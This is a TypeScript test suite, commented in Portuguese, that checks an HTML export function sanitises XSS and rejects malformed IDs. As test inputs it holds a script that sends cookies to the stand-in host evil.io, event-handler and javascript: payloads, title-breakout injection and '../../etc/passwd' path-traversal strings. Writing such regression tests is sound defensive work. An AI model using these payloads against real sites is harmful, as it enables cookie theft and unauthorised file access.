/**
 * H6 — XSS no export HTML.
 *
 * `bodyContent` era injetado cru em `<main>`: um `<script>` no conteúdo virava
 * HTML executável quando o usuário abrisse o arquivo exportado.
 */

import { describe, expect, it, vi } from "vitest";

const written: Array<{ path: string; content: string }> = [];

vi.mock("../storage", () => ({
  storageWrite: async (_exec: string, input: { path: string; content: unknown }) => {
    const content =
      typeof input.content === "string" ? input.content : String(input.content);
    written.push({ path: input.path, content });
    return { size: content.length };
  },
}));

import { exportHtml, runExportTool } from "../export";

const EXEC = "33333333-3333-4333-8333-333333333333";

async function render(content: string, title = "Doc") {
  written.length = 0;
  await exportHtml({ content, title, filename: "teste.html" }, EXEC);
  return written[0].content;
}

describe("H6 — export HTML sanitizado", () => {
  it("remove <script> do conteúdo", async () => {
    const html = await render('<script>fetch("https://evil.io?c="+document.cookie)</script>');
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("evil.io");
  });

  it("remove handlers onerror/onload", async () => {
    const html = await render('<img src=x onerror="alert(1)">');
    expect(html.toLowerCase()).not.toContain("onerror");
    expect(html).not.toContain("alert(1)");
  });

  it("remove href/src com javascript:", async () => {
    const html = await render('<a href="javascript:alert(1)">clique</a>');
    expect(html.toLowerCase()).not.toContain("javascript:");
  });

  it("remove iframe, svg e form", async () => {
    const html = await render(
      '<iframe src="https://evil.io"></iframe><svg><script>1</script></svg><form action="https://evil.io"><input name="x"></form>'
    );
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("<svg");
    expect(html).not.toContain("<form");
  });

  it("mantém HTML legítimo (títulos, listas, tabelas, código)", async () => {
    const html = await render("<h2>Relatório</h2><ul><li>item</li></ul><p><strong>ok</strong></p>");
    expect(html).toContain("<h2>Relatório</h2>");
    expect(html).toContain("<li>item</li>");
    expect(html).toContain("<strong>ok</strong>");
  });

  it("escapa injeção no título", async () => {
    const html = await render("corpo", '</title><script>alert(1)</script>');
    expect(html).not.toContain("<script>alert(1)</script>");
  });

  it("ID de execução malformado no runner público vira erro tratado, sem executar", async () => {
    written.length = 0;
    const res = await runExportTool(
      "files.export_html",
      JSON.stringify({ content: "ok", filename: "x.html" }),
      "../../etc/passwd",
      "11111111-1111-4111-8111-111111111111"
    );
    expect(res.ok).toBe(false);
    expect((res as { error?: string }).error).toBe("INVALID_INPUT");
    expect(written.length).toBe(0);
  });

  it("userId malformado no runner público é recusado", async () => {
    written.length = 0;
    const res = await runExportTool(
      "files.export_html",
      JSON.stringify({ content: "ok", filename: "x.html" }),
      undefined,
      "../../etc"
    );
    expect(res.ok).toBe(false);
    expect(written.length).toBe(0);
  });
});
